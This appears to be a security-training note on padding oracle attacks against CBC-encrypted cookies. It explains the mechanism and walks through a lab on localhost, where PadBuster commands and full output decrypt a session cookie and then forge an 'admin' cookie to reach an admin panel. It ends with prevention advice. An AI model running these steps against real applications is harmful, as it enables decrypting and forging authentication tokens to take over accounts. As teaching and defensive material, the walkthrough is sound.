---
technique: "Padding Oracles"
family: "http-protocol"
severity_hint: "low"
tags: []
source: "_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Padding Oracles.md"
source_sha256: "f64d5aca4de4977f4468b897f17c872055439b3be843118240faa6a1cd7c180d"
curator_version: 2
review_status: imported-unreviewed
---

# Padding Oracles

> Family: **http-protocol** · Severity hint: **low** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `bash: padbuster+-------------------------------------------+`
- `bash: padbuster http://127.0.0.1:1337/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -e`
- `bash: padbuster http://127.0.0.1:1337/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -e`

## Playbook (operator notes)

# Padding Oracles

- **Block ciphers** require input to match block size → padding is added.
- **Example:** AES uses 16-byte blocks → 30-byte input needs 2 bytes padding.
- **Issue:** Simple schemes (e.g., appending `FF`) cause ambiguity if plaintext ends with same value as padding.
- **Solution:** Modern padding schemes encode the **padding length**, ensuring correct removal after decryption.

---

### **Padding Oracles**

- **Cause:** Verbose error messages reveal padding issues in CBC mode.
- **Attack principle:** Attacker forges ciphertexts and brute-forces padding bytes using leaked error info.
- **Impact:** Enables decryption of ciphertexts without the key; in some cases, even encryption of chosen plaintexts.
- **Mechanism:** By modifying the previous block until valid padding occurs, attacker learns intermediate values → recovers plaintext bytes block by block.

### Tools

[https://github.com/AonCyberLabs/PadBuster](https://github.com/AonCyberLabs/PadBuster)

`sudo apt install padbuster`

### **Identification**

After logging in with the provided credentials and inspecting the traffic in burp, we can see that the application sets a custom cookie of the form `user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=`. The cookie looks like base64 encoded content, however, decoding it reveals that it is binary data. After attempting to access the admin panel in the application, we get an `Unauthorized` response:

### **Exploitation**

```bash
padbuster+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

    Use: padbuster URL EncryptedSample BlockSize [options]

<SNIP>
```

PadBuster needs the URL, an encrypted sample, and the block size. We obtained an encrypted sample in the `use`cookie, and we can specify the URL to the admin endpoint. We do not know the block size but we can guess it. We will start with a block size of 16 since that is the block size of AES. In practice, we might have to try different values for the block size if the attack fails. Common block sizes are 8 and 16.

Additionally, we need to specify that the ciphertext is contained within a cookie, which we can do with the `-cookies` flag. If the payload was transmitted in a POST parameter, we would have to use the `-post` parameter.

We can also specify the encoding of the data with the `-encoding` flag. In this case, the data is base64 encoded, which corresponds to the value `0`. This results in the following command:

```bash
padbuster http://127.0.0.1:1337/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -encoding 0 -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0="<SNIP>

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location-------------------------------------------------------
1	2	401	12	N/A
2 **	254	500	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2Continuing test with selection 2

[+] Success: (253/256) [Byte 16]
[+] Success: (256/256) [Byte 15]
[+] Success: (137/256) [Byte 14]
[+] Success: (150/256) [Byte 13]
[+] Success: (159/256) [Byte 12]
[+] Success: (142/256) [Byte 11]
[+] Success: (140/256) [Byte 10]
[+] Success: (219/256) [Byte 9]
[+] Success: (149/256) [Byte 8]
[+] Success: (130/256) [Byte 7]
[+] Success: (157/256) [Byte 6]
[+] Success: (207/256) [Byte 5]
[+] Success: (129/256) [Byte 4]
[+] Success: (149/256) [Byte 3]
[+] Success: (132/256) [Byte 2]
[+] Success: (155/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 9401fe784d12e3ee342f28c7b70dd73d
[+] Intermediate Bytes (HEX): 757365723d6874622d7374646e740202
[+] Plain Text: user=htb-stdnt

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=htb-stdnt

[+] Decrypted value (HEX): 757365723D6874622D7374646E740202

[+] Decrypted value (Base64): dXNlcj1odGItc3RkbnQCAg==

-------------------------------------------------------
```

PadBuster looks for differences in the response to tell whether the 
padding was valid or not and asks us to confirm the choice. In this 
case, we can use the suggested value of 2. PadBuster is also able to 
look at the content of the response when the `-usebody` flag is specified. By default, it only looks at the response status code and length.
After doing so, PadBuster successfully executes a padding oracle attack and can decrypt the value contained in the cookie: `user=htb-stdnt`.

We could also tell PadBuster to look for a specific error string to 
determine whether the padding was valid or not. To do so, we can use the
 `-error` flag and provide the error string. In our web application, that would be `-error 'Invalid Padding'`.

### **Encrypting Custom Value**

From decrypting the cookie, we can deduce that it stores the username of the logged-in user. To access the admin panel, we can attempt to encrypt our own forged cookie for another user, for instance, the `admin` user. To do so, we can use PadBuster's `-plaintext` flag and specify the plaintext we want to encrypt:

```bash
padbuster http://127.0.0.1:1337/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -encoding 0 -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" -plaintext "user=admin" <SNIP>

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location-------------------------------------------------------
1	1	401	12	N/A
2 **	255	500	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2Continuing test with selection 2

[+] Success: (97/256) [Byte 16]
[+] Success: (9/256) [Byte 15]
[+] Success: (179/256) [Byte 14]
[+] Success: (174/256) [Byte 13]
[+] Success: (215/256) [Byte 12]
[+] Success: (235/256) [Byte 11]
[+] Success: (61/256) [Byte 10]
[+] Success: (249/256) [Byte 9]
[+] Success: (221/256) [Byte 8]
[+] Success: (192/256) [Byte 7]
[+] Success: (197/256) [Byte 6]
[+] Success: (207/256) [Byte 5]
[+] Success: (96/256) [Byte 4]
[+] Success: (233/256) [Byte 3]
[+] Success: (85/256) [Byte 2]
[+] Success: (192/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 25d77cdf00512e4766aa152a5048f398
[+] Intermediate Bytes (HEX): 50a419ad3d304a2a0fc4132c564ef59e

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: Jdd83wBRLkdmqhUqUEjzmAAAAAAAAAAAAAAAAAAAAAA%3D
-------------------------------------------------------

```

---

## Prevention

Padding Oracle attacks exist because of the improper use of 
cryptographic algorithms. Even if the encryption algorithm is secure, it
 may still be vulnerable if used incorrectly. Therefore it is important 
to know what you are doing when implementing anything related to 
encryption. In particular, padding oracle attacks can be prevented by 
not letting the user know that the padding was invalid. Instead of 
displaying a specific error message about invalid padding, a generic 
error message should be displayed when the decryption fails. The 
application has to behave the exact same way whether the expected 
padding was correct or not. Most importantly, remember that you should "[Never Roll-Your-Own Crypto](https://www.infosecinstitute.com/resources/cryptography/the-dangers-of-rolling-your-own-encryption/)", and instead try to use common encryption libraries.

## Source
Original note: `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Padding Oracles.md`
